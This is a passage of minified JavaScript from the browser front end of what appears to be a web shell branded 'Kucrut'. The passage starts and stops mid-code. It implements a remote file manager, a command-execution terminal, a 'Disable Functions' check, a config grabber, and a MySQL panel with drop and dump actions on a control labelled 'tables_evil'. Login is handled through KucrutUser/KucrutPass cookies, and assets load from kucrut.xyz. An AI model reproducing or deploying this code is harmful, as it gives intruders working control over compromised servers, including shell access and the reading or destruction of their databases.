type="checkbox" class="db-opt-id"><select onchange="kucrutMysqlTablesDumpDrop(this);" class="db-opt-id" db_id="'+a+'" target=".cls-'+i+'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="kucrutMysqlTablesDumpDropBtn(this);return false;" db_id="'+a+'" class="db-opt-id" db_target="'+i+'" target=".cls-'+i+'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>',t.innerHTML=r,d.querySelector("#"+a+" .cls-"+i+"-expander img").src="https://solevisible.com/icons/menu/b_minus.png"}function kucrutMysqlQuery(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" textarea[name=query]").value;kucrutMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_load_query_data",db_info:{query:i},post:{kucrut2:"query"}},function(e){0!=e.length&&(e=JSON.parse(e),kucrutMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.status?e.table:"",kucrutMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0))})}function kucrutMysqlReportBuilder(e,t){var a="";t.status||(a="<div><span>Error: </span><div style='padding-left: 50px;'><pre>"+t.error+"</pre></div></div>");var i="<div><span>Query:</span><div style='padding-left: 50px;'><pre>"+t.query+"</pre></div>"+a+"</div>";d.querySelector("#"+e+" .mysql-query-reporter").innerHTML=i}function kucrutMysqlTablePanelCtl(e){var t=e.getAttribute("db_id"),a=(t=e.getAttribute("db_id"),d.querySelector("#"+t)),i=a.querySelector(".tables-panel-ctl");"none"==i.getAttribute("mode")?(a.querySelector(".mysql-tables").style.display="block",i.setAttribute("mode","block"),i.innerHTML="&#x3C;&#x3C;",a.querySelector(".mysql-query-results-fixed").classList.remove("mysql-query-results-fixed")):(a.querySelector(".mysql-tables").style.display="none",i.setAttribute("mode","none"),i.innerHTML="&#x3E;&#x3E;",a.querySelector(".mysql-query-results").classList.add("mysql-query-results-fixed")),i.classList.toggle("tables-panel-ctl-min")}function kucrutMysqlTabCtl(e,t){var a=void 0===t?e.getAttribute("db_id"):e.db_id,i=void 0===t?e.getAttribute("target"):e.target;d.querySelectorAll("#"+a+" .mysql-query-content").forEach(function(e){e.classList.add("mysql-hide-content")}),d.querySelector("#"+a+" .mysql-query-result-tabs .mysql-query-selected-tab").classList.remove("mysql-query-selected-tab"),void 0===t?e.classList.add("mysql-query-selected-tab"):d.querySelector("#"+a+" .mysql-query-result-tabs div:nth-child("+e.child+")").classList.add("mysql-query-selected-tab"),d.querySelector("#"+a+" "+i).classList.remove("mysql-hide-content")}function kucrutLoadTableData(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id");kucrutMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_load_table_data",db_info:{table:t},post:{kucrut2:"load_data"}},function(e){if(0!=e.length){e=JSON.parse(e);var l="",r="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th></tr>",o="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th><th>Change</th></tr>",n="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Collation</th><th>Operator</th><th>Value</th></tr>",s=["int","smallint","bigint","tinyint","mediumint"],c=["longtext","text","mediumtext","tinytext"];for(var u in e.columns){var p="text";-1!=s.indexOf(e.columns[u].data_type)&&(p="number"),n+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+e.columns[u].collation+"</td><td><select name='"+e.columns[u].name+"'><option value='='>=</option><option value='!='>!=</option><option value='>'>&gt;</option><option value='>='>&gt;=</option><option value='<'>&lt;</option><option value='<='>&lt;=</option><option value=\"= ''\">= ''</option><option value=\"!= ''\">!= ''</option><option value='LIKE'>LIKE</option><option value='LIKE %...%'>LIKE %...%</option><option value='NOT LIKE'>NOT LIKE</option><option value='REGEXP'>REGEXP</option><option value='REGEXP ^...$'>REGEXP ^...$</option><option value='NOT REGEXP'>NOT REGEXP</option><option value='IN (...)'>IN (...)</option><option value='NOT IN (...)'>NOT IN (...)</option><option value='BETWEEN'>BETWEEN</option><option value='NOT BETWEEN'>NOT BETWEEN</option><option value='IS NULL'>IS NULL</option><option value='IS NOT NULL'>IS NOT NULL</option></select></td><td><input type='"+p+"' name='"+e.columns[u].name+"'></td></tr>";var f=kucrutMysqlLoadDataType(e.columns[u].data_type);null==e.columns[u].type_value&&(e.columns[u].type_value=""),o+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td><select name='sel_"+e.columns[u].name+"'>"+f+"</select></td><td><input name='value_"+e.columns[u].name+"' type='text' value='"+(-1==c.indexOf(e.columns[u].data_type)?e.columns[u].type_value:"")+"'></td><td><button col_name='"+e.columns[u].name+"' tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='kucrutMysqlAlterTbl(this);return false;'>Change</button></td></tr>";var m="";switch(e.columns[u].data_type){case"longtext":case"text":m="<textarea name='"+e.columns[u].name+"' rows='5'></textarea>";break;case"int":case"smallint":case"bigint":m="<input type='number' name='"+e.columns[u].name+"' value=''>";break;default:m="<input type='text' name='"+e.columns[u].name+"' value=''>"}r+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+m+"</td></tr>"}if(r+="</table><div style='margin-left:20px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='kucrutMysqlUpdateRow(this, \"insert\");return false;'>Insert</button></div><div class='mysql-insert-result'></div>",o+="</table><div class='mysql-structure-qres'></div>",n+="</table><div style='padding-left: 384px;margin-top: 15px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='kucrutMysqlSearch(this);return false;'>Search</button></div>",e.pages>0){l+="<span style='cursor:pointer;' db_id='"+i+"' onclick='kucrutMysqlChangePage(this,1);'><<</span> <span> page: </span> <select tbl_name='"+t+"' db_target='"+a+"' name='mysql-q-pages' db_id='"+i+"' class='db-opt-id' onchange='kucrutMysqlChangePage(this);' pages='"+e.pages+"'>";for(var b=1;b<e.pages+1;b++)l+="<option>"+b+"</option>";l+="</select><span> Of "+e.pages+"</span> <span style='cursor:pointer;' db_id='"+i+"' onclick='kucrutMysqlChangePage(this,2);'>>></span>"}var y=d.querySelector("#"+i);y.querySelector(".mysql-search-area").innerHTML=n,y.querySelector(".mysql-insert-row").innerHTML=r,y.querySelector(".mysql-edit-row").innerHTML="",y.querySelector(".mysql-structure").innerHTML=o,y.querySelector(".mysql-query-result-header .mysql-query-pager").innerHTML=l,y.querySelector(".mysql-query-table").innerHTML=e.status?e.table:"",kucrutMysqlTabCtl({child:1,db_id:i,target:".mysql-query-result-content"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="none",kucrutMysqlReportBuilder(i,e)}})}function kucrutMysqlAlterTbl(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r=e.getAttribute("col_name"),o={};o.type=i.querySelector(".mysql-structure select[name=sel_"+r+"]").value,o.input=i.querySelector(".mysql-structure input[name=value_"+r+"]").value,kucrutMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_alter",db_info:{table:l,column:r,alter:o},post:{kucrut2:"alter"}},function(e){var t=d.querySelector("#"+a+" .mysql-structure-qres");t.innerHTML=e,t.style.display="block"})}function kucrutMysqlSearch(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r={};i.querySelectorAll(".mysql-search-area input, .mysql-search-area select").forEach(function(e){r.hasOwnProperty(e.name)||(r[e.name]={}),"SELECT"==e.tagName?r[e.name].opt=e.value:r[e.name].value=e.value}),kucrutMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_search_query",db_info:{table:l,search:r},post:{kucrut2:"search"}},function(e){0!=e.length&&(e=JSON.parse(e),kucrutMysqlReportBuilder(a,e),kucrutMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function kucrutMysqlEditRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=(d.querySelector("#"+i),e.getAttribute("col_key")),r=e.getAttribute("key"),o=e.getAttribute("tbl_name"),n=e.getAttribute("row_id");kucrutMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_table_edit_query",db_info:{table:o,col_key:l,key:r},post:{kucrut2:t}},function(e){if(0!=e.length)if(e=JSON.parse(e),"edit"==t){var s="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th></tr>";for(var c in e){var u="";switch(e[c].type.tag){case"textarea":u="<textarea name='"+e[c].col+"' rows='5'>"+e[c].value+"</textarea>";break;case"input":u="<input type='"+e[c].type.type+"' name='"+e[c].col+"' value='"+e[c].value+"'>"}s+="<tr><th style='text-align: left;'>"+e[c].col+"</th><td>"+e[c].type.col_type+"</td><td>"+u+"</td></tr>"}s+="</table><div style='margin-left:20px;'><button col_key='"+l+"' key='"+r+"' tbl_name='"+o+"' db_id='"+i+"' db_target='"+a+"' onclick='kucrutMysqlUpdateRow(this, \"edit\");return false;'>Update</button></div><div class='mysql-update-result'></div>",d.querySelector("#"+i+" .mysql-edit-row").innerHTML=s,kucrutMysqlTabCtl({child:6,db_id:i,target:".mysql-edit-row"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="inline-block"}else"delete"==t&&(e.status?d.querySelector("#"+i+" .tbl_row_l"+n).remove():alert(e.error))})}function kucrutMysqlTblSelectAll(e){var t=e.getAttribute("db_id");d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(t){t.checked=e.checked})}function kucrutMysqlDeleteAllSelectedrows(e){var t=e.getAttribute("db_id"),a=e.getAttribute("db_target"),i=e.getAttribute("col_key"),l=e.getAttribute("tbl_name"),r=[];if(d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&r.push(e.value)}),0==r.length)return!1;kucrutMysqlApi({db_id:t,db_target:a,ajax_id:"mysql_table_delete_all_query",db_info:{table:l,col_key:i,rows:r},post:{kucrut2:"delete_all"}},function(e){if(""!=e)if((e=JSON.parse(e)).status){var a=0,i=d.querySelector("#"+t);d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&(a=e.getAttribute("row_id"),i.querySelector(".tbl_row_l"+a).remove())})}else alert(e.error)})}function kucrutMysqlUpdateRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=d.querySelector("#"+i),r=".mysql-insert-row",o=".mysql-insert-result",n="mysql_table_insert_query",s="insert",c={table:e.getAttribute("tbl_name")};if("edit"==t){var u=e.getAttribute("col_key"),p=e.getAttribute("key");r=".mysql-edit-row",o=".mysql-update-result",n="mysql_table_update_query",s="update",c.col_key=u,c.key=p}var f={};l.querySelectorAll(r+" input, "+r+" textarea").forEach(function(e){f.hasOwnProperty(e.name)||(f[e.name]={}),f[e.name]=e.value}),c.data=f,kucrutMysqlApi({db_id:i,db_target:a,ajax_id:n,db_info:c,post:{kucrut2:s}},function(e){if(0!=e.length){e=JSON.parse(e);var t=d.querySelector("#"+i+" "+o);t.style.display="block",e.status?t.innerHTML="Success...":t.innerHTML=e.error}})}function kucrutMysqlLoadDataType(e){e=e.toUpperCase();var t=["INT","VARCHAR","TEXT","DATE",{key:"Numeric",vals:["TINYINT","SMALLINT","MEDIUMINT","INT","BIGINT","-","DECIMAL","FLOAT","DOUBLE","REAL","-","BIT","BOOLEAN","SERIAL"]},{key:"Date and time",vals:["DATE","DATETIME","TIMESTAMP","TIME","YEAR"]},{key:"String",vals:["CHAR","VARCHAR","-","TINYTEXT","TEXT","MEDIUMTEXT","LONGTEXT","-","BINARY","VARBINARY","-","TINYBLOB","MEDIUMBLOB","BLOB","LONGBLOB","-","ENUM","SET"]},{key:"Spatial",vals:["GEOMETRY","POINT","LINESTRING","POLYGON","MULTIPOINT","MULTILINESTRING","MULTIPOLYGON","GEOMETRYCOLLECTION"]},{key:"JSON",vals:["JSON"]}],a="",i=!1;for(var l in t)if("object"==typeof t[l]){for(var r in a+='<optgroup label="'+t[l].key+'">',t[l].vals)a+="<option"+(t[l].vals[r]!=e||i?"":" selected")+">"+t[l].vals[r]+"</option>",t[l].vals[r]==e&&(i=!0);a+="</optgroup>"}else a+="<option"+(t[l]!=e||i?"":" selected")+">"+t[l]+"</option>",t[l]==e&&(i=!0);return a}function kucrutMysqlChangePage(e,t){var a=e.getAttribute("db_id"),i=0;if(void 0!==t){e=d.querySelector("#"+a+" select[name=mysql-q-pages]");var l=parseInt(e.getAttribute("pages"));if(i=parseInt(e.value),1==t?--i:++i,0==i||l<i)return!1;e.value=i}else i=e.value;var r=e.getAttribute("db_target"),o=e.getAttribute("tbl_name");kucrutMysqlApi({db_id:a,db_target:r,ajax_id:"mysql_table_change_page",db_info:{table:o,page:i},post:{kucrut2:"page"}},function(e){0!=e.length&&(e=JSON.parse(e),kucrutMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function kucrutRemoveCookie(e){document.cookie=e+"=;Max-Age=0; path=/;"}function kucrutLogOut(){kucrutRemoveCookie("KucrutUser"),kucrutRemoveCookie("KucrutPass"),location.reload()}var kucrutAlertBox=function(e,t){this.types={success:{class:"alert-success",icon:"https://kucrut.xyz/images/check-mark.svg"},error:{class:"alert-error",icon:"https://solevisible.com/icons/menu/warning.svg"}},this.show=function(a){if(""===a||null==a)throw'"msg parameter is empty"';var i=document.querySelector(e),l=document.createElement("DIV"),r=document.createElement("DIV"),o=document.createElement("DIV"),n=document.createElement("A"),s=document.createElement("div"),c=document.createElement("IMG"),d=this;if(s.style.display="inline-block",s.style.marginRight="10px",r.style.display="inline-block",o.classList.add("alert-content"),o.innerText=a,n.classList.add("alert-close"),n.setAttribute("href","#"),l.classList.add("alert-box"),c.src=this.types[t.type].icon,c.style.width="30px",s.appendChild(c),l.appendChild(s),t.hasOwnProperty("title")){var u=document.createElement("DIV");u.classList.add("alert-content-title"),u.innerText=t.title,r.appendChild(u)}if(r.appendChild(o),l.appendChild(r),t.hideCloseButton&&void 0!==t.hideCloseButton||l.appendChild(n),t.hasOwnProperty("type")&&l.classList.add(this.types[t.type].class),i.appendChild(l),n.addEventListener("click",function(e){e.preventDefault(),d.hide(l)}),!t.persistent)var p=setTimeout(function(){d.hide(l),clearTimeout(p)},t.closeTime)},this.hide=function(e){e.classList.add("hide");var t=setTimeout(function(){e.parentNode.removeChild(e),clearTimeout(t)},500)}};function kucrutShowNotification(e,t,a,i,l){void 0===a&&(a="success"),void 0===i&&(i=!1),void 0===l&&(l=1e4);var r={closeTime:l,persistent:i,type:a,hideCloseButton:!1};void 0!==t&&(r.title=t),new kucrutAlertBox("#alert-area",r).show(e)}function kucrutSyncMenuToOpt(e,t){var a="",i="",l=null;void 0!==t?(a="view_archive",i=e,l=location):(a=e.name,i=e.getAttribute("fname"),l=e),"extract"==a?(kucrut_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=deziper",g("deziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="DeCompressor"):"compress"==a?(kucrut_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=ziper",g("ziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="Compressor"):"view_archive"==a&&(kucrut_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=archive_manager",g("archive_manager",null,"",c_+"/"+i,""),d.querySelector(".opt-title").innerHTML="Archive Manager")}function doFilterName(e){var t="#filesman_holder_"+kucrut_current_fm_id;setTimeout(function(){var a=new RegExp(e.value,"i");d.querySelectorAll(t+" .fmanager-row").forEach(function(e){-1==e.querySelector(".main_name").getAttribute("fname").search(a)?e.style.display="none":e.style.display="table-row"})},100)}function sortBySelectedValue(e,t){setCookie(t,e.options[e.selectedIndex].value,2012),g("FilesMan",c_)}function loadPopUpDatabase(e,t,a){if(console.log(t),$("database_window").style.display="block",void 0===t){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}try{d.querySelector(".sql-tabs .sql-newtab").remove()}catch(e){}var i="id_db_"+getRandom(10);d.querySelector("#database_window .content_options_holder .sql-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="sql-content sql-active-content">'+e+"</div>"),d.querySelector("#database_window .content_options_holder .sql-tabs").insertAdjacentHTML("beforeend",'<div id="tab_'+i+'" opt_id="'+i+'" class="sql-tabname sql-active-tab" onclick="dbTabController(this);"><span style="font-weight:unset;">New DB Connection</span> <img opt_id="'+i+'" onclick="closeDatabase(this,event);return false;" title="[close]" src="https://kucrut.xyz/images/delete.svg"></div><div class="sql-newtab" onclick="kucrut_can_add_opt=true;g(\'sql\',null,\'\',\'\',\'\');" style="background-color:#800000;"><span style="font-weight:unset;">New Tab +</span></div>'),$(i).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",i)});try{$(i).querySelector(".getconfig").setAttribute("base_id",i)}catch(e){}return i}$(t).innerHTML=e;var l=$("tab_"+t);null!=l&&((-1==l.classList.value.indexOf("sql-active-tab")||database_window_is_minimized)&&(l.classList.add("tab-is-done"),kucrutShowNotification("proccess is done...","DB: "+l.innerText)),database_window_is_minimized&&kucrutUpdateOptionsBadge("database_window")),void 0!==mysql_cache[t]&&mysql_cache[t].hasOwnProperty("db")&&mysql_cache[t].db.length>0&&"update"!=a&&(d.querySelector("#tab_"+t+">span").innerHTML=mysql_cache[t].db),$(t).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",t)});try{$(t).querySelector(".getconfig").setAttribute("base_id",t)}catch(e){}database_window_is_minimized||(d.body.style.overflow="hidden")}function loadPopUpOpTions(e,t){console.log(e),kucrut_before_do_action_id="",$("options_window").style.display="block";var a=$("option_"+e);if(kucrut_can_add_opt){kucrut_can_add_opt=!1;try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var i="",l=$("menu_opt_"+e).innerHTML;"market"==e?l="Kucrut Market":"GetDisFunc"==e&&(l="Disable Functions");try{d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}if(null!=a){var r=a.getAttribute("opt_count");null!=r?(i=parseInt(r)+1,a.setAttribute("opt_count",i)):(i=1,a.setAttribute("opt_count",i))}var o="option_"+e+i;d.querySelector("#options_window .content_options_holder .options_content").insertAdjacentHTML("afterbegin",'<div id="'+o+'" class="options_holder">'+t+"</div>"),d.querySelector("#options_window .content_options_holder .options_tab").insertAdjacentHTML("beforeend",'<div opt_id="'+o+'" onclick="optionsTabController(this);" title="'+l+'" id="tab_'+o+'" class="tab_name tab_is_active">'+l+' <img opt_id="'+o+'" onclick="closeOption(this,event);return false;" title="[close]" src="https://kucrut.xyz/images/delete.svg"></div>'),$(o).classList.toggle("option_is_active"),d.querySelectorAll("#"+o+" form, #"+o+" a").forEach(function(t){var a=t.classList.value;if("getconfig"==a||"rejectme"==a)return!1;if("FORM"==t.tagName){var l=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'kucrutBeforeDoAction("'+e+i+'");'+l),t.setAttribute("opt_id",e+i)}else{l=t.getAttribute("onclick");t.setAttribute("onclick",'kucrutBeforeDoAction("'+e+i+'");'+l)}});try{$(o).querySelector(".getconfig").setAttribute("base_id",e+i)}catch(e){}return e+i}a.innerHTML=t;var n=$("tab_option_"+e);null!=n&&((-1==n.classList.value.indexOf("tab_is_active")||options_window_is_minimized)&&(n.classList.add("tab-is-done"),kucrutShowNotification("proccess is done...",n.innerText)),options_window_is_minimized&&kucrutUpdateOptionsBadge("options_window")),d.querySelectorAll("#option_"+e+" form, #option_"+e+" a").forEach(function(t){var a=t.classList.value;if("getconfig"==a||"rejectme"==a)return!1;if("FORM"==t.tagName){var i=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'kucrutBeforeDoAction("'+e+'");'+i),t.setAttribute("opt_id",e)}else{i=t.getAttribute("onclick");t.setAttribute("onclick",'kucrutBeforeDoAction("'+e+'");'+i)}});try{a.querySelector(".getconfig").setAttribute("base_id",e)}catch(e){}options_window_is_minimized||(d.body.style.overflow="hidden")}function kucrutBeforeDoAction(e){kucrut_before_do_action_id=e}function kucrutLoaderOnTop(e){$("a_loader").style.display=e,d.body.style.overflow="block"==e?"hidden":"visible"}function kucrutAjaxController(e){var t=e.getAttribute("parent");$("loader_"+t).remove(),"filesman_holder"==t.substr(0,15)&&($(t).style.minHeight="0"),_KUCRUT_AJAX_.hasOwnProperty(t)&&_KUCRUT_AJAX_[t].abort()}function closeDatabase(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("sql-active-tab"))if((e=d.querySelectorAll(".sql-tabs .sql-tabname")).length>1){e[0].classList.add("sql-active-tab");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("sql-active-content")}else editorClose("database_window");d.querySelector("div[opt_id="+a+"]").remove()}function closeFmTab(e,t){t.stopPropagation();var a=e.getAttribute("fm_id"),i=$("filesman_tab_"+a);if(-1!=i.classList.value.indexOf("filesman-tab-active")&&(e=d.querySelectorAll("#filesman_tabs .filesman_tab")).length>1){e[0].classList.add("filesman-tab-active");var l=e[0].getAttribute("fm_id"),r="filesman_holder_"+l;if(null!=$(r)){$(r).classList.toggle("filesman-active-content");var o=$("filesman_tab_"+l).getAttribute("path");initDir(o),d.mf.c.value=o,kucrut_current_fm_id=l}}i.remove(),$("filesman_holder_"+a).remove(),kucrutFilesmanTabHideTitle()}function closeOption(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("tab_is_active"))if((e=d.querySelectorAll(".options_tab .tab_name")).length>1){e[0].classList.add("tab_is_active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("option_is_active")}else editorClose("options_window");d.querySelector("div[opt_id="+a+"]").remove()}function historyPanelController(e){"hidden"==e.getAttribute("mode")?(d.querySelector(".editor-explorer").style.display="block",d.querySelector(".editor-modal").style.marginLeft="20%",e.setAttribute("mode","visible"),e.style.left="19%",e.innerHTML="<<"):(d.querySelector(".editor-explorer").style.display="none",d.querySelector(".editor-modal").style.marginLeft="1%",e.setAttribute("mode","hidden"),e.style.left="0%",e.innerHTML=">>")}function closeTerminalContent(e,t){t.stopPropagation();var a=e.getAttribute("term_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("active-terminal-tab"))&&(e=d.querySelectorAll(".terminal-tabs .terminal-tab")).length>1){e[0].classList.add("active-terminal-tab");var i=e[0].getAttribute("term_id");null!=$(i)&&$(i).classList.toggle("active-terminal-content")}d.querySelector("div[term_id="+a+"]").remove()}function closeEditorContent(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("editor-tab-active"))&&(e=d.querySelectorAll(".editor-tabs .editor-tab-name")).length>1){e[0].classList.add("editor-tab-active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("editor-content-active")}d.querySelector("div[opt_id="+a+"]").remove()}function optionsTabController(e){try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("option_is_active");try{d.querySelector("#options_window .content_options_holder .options_tab \t.tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("tab_is_active"),d.querySelector(".opt-title").innerHTML=e.getAttribute("title"),kucrutUpdateOptionsBadge("options_window")}function terminalTabController(e){try{d.querySelector(".terminal-tab.active-terminal-tab").classList.remove("active-terminal-tab")}catch(e){}try{d.querySelector(".terminal-content.active-terminal-content").classList.remove("active-terminal-content")}catch(e){}var t=e.getAttribute("term_id");if(null==t)return!1;$(t).classList.toggle("active-terminal-content"),e.classList.remove("tab-is-done"),e.classList.add("active-terminal-tab"),$(t).querySelector(".php-terminal-input").focus(),kucrutUpdateOptionsBadge("cgiloader")}function filesmanTabController(e){try{d.querySelector(".ajaxarea.filesman-active-content").classList.remove("filesman-active-content")}catch(e){}try{d.querySelector(".filesman_tab.filesman-tab-active").classList.remove("filesman-tab-active")}catch(e){}var t=e.getAttribute("fm_id");if(null==t)return!1;kucrut_current_fm_id=t,e.classList.add("filesman-tab-active"),e.classList.remove("tab-is-done"),$("filesman_holder_"+t).classList.toggle("filesman-active-content");var a=e.getAttribute("path");initDir(a),d.mf.c.value=a}function dbTabController(e){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("sql-active-content"),e.classList.remove("tab-is-done"),e.classList.add("sql-active-tab"),kucrutUpdateOptionsBadge("database_window")}function editorTabController(e,t){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}var a=null;void 0===t?a=e.getAttribute("opt_id"):(a=e,e=$("tab_"+a));var i=editor_files["file_"+a.replace("editor_source_","")];if(void 0!==i&&(d.querySelector(".editor-path").innerHTML=(i.pwd+"/"+i.file).replace(/\/\//g,"/")),null==a)return!1;$(a).classList.toggle("editor-content-active");try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("editor-tab-active"),kucrutUpdateOptionsBadge("editor")}function kucrutUpdateOptionsBadge(e){var t=d.querySelector("#"+e+"-minimized .options_min_badge");if(null!=t){var a=d.querySelectorAll("#"+e+" .tab-is-done").length;t.innerHTML=a,t.style.visibility=a>0?"visible":"hidden"}}function kucrutOpenPhpTerminal(e){if(php_temrinal_using_cgi&&void 0===e)showEditor("cgiloader");else{$("cgiloader").style.display="block",$("cgiloader").style.background="rgba(0, 0, 0, 0.57)",$("cgiframe").style.background="rgba(0, 0, 0, 0.81)",$("cgiframe").style.border="1px solid rgb(30, 86, 115)",$("cgiframe").style.height="90%",$("cgiframe").style.padding="3px",d.querySelector("#cgiloader .opt-title").innerHTML="Terminal";var t="",a="",i="terminal_id_"+getRandom(10);void 0===e&&(t=" active-terminal-content",a=" active-terminal-tab"),d.querySelector("#cgiframe .terminal-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="terminal-content'+t+'"><div class="php-terminal-output"><div><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+'\',1);">+</button><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+"',0);\">-</button><input onchange=\"kucrutTerminalChangecolor(this,'"+i+'\');" style="height: 18px;background: #dde2e2;" type="color"></div><pre class="ml1" style="border:unset;height: 90%;"></pre></div><div><form term_id="'+i+'" onSubmit="kucrutExecTerminal(this);this.c.value=\'\';return false;" autocomplete="off" style="margin-top: 10px;"><div style="overflow: auto;white-space: nowrap;"><div style="display: inline-block;color:#4fbec3;margin-bottom:5px;margin-right:5px;">CWD:~# </div><div style="display: inline-block;color:#42ec42;" class="php-terminal-current-dir"></div></div><div style="position:relative;"><span style="color: #00ff08;font-size: 25px;">$ </span><input style="padding: 8px;font-size: 20px;width: 67%;border: 1px solid #27979B;padding-right:35px;" onkeyup="kucrutWalkInTerminalHistory(this,event,\''+i+'\');" term_id="'+i+'" class="php-terminal-input" type="text" name="c" onfocus="closeHistoryCmd(\'free\',this);" placeholder="ls -la"><button class="button" style="color: #27979B;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;">ExeCute<button term_id="'+i+'" class="button" style="color: #27979B;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;" onClick="kucrutExecTerminal(this, 1);return false;">Current Dir</button><div class="cmd-history-holder"><div class="commands-history-header">History</div><span onClick="clearTerminalHistory();" style="border-bottom: 1px solid;margin-bottom: 5px;display: inline-block;padding: 5px;color: #59de69;cursor: pointer;">Clear history</span><div style="overflow: auto;height: 82%;" class="commands-history"></div></div><div term_id="'+i+'" class="cmd-history-icon" mode="" onclick="closeHistoryCmd(this);"><img style="width:27px;" src="https://solevisible.com/icons/menu/time2.svg"></div></form></div></div></div>');try{$("terminal_new_tab").remove()}catch(e){}d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="terminalTabController(this);" term_id="'+i+'" id="tab_'+i+'" class="terminal-tab'+a+'">Terminal <img term_id="'+i+'" onclick="closeTerminalContent(this,event);return false;" title="[close]" src="https://kucrut.xyz/images/delete.svg"></div>'),d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="kucrutOpenPhpTerminal(true);" id="terminal_new_tab" style="background-color:#800000;" class="terminal-tab">New Tab +</div>'),terminal_walk_index[i]={index:0,key:-1},d.querySelector("#"+i+" .php-terminal-input").focus(),d.querySelector("#"+i+" .php-terminal-current-dir").innerHTML=c_,d.querySelector("#cgiloader-minimized 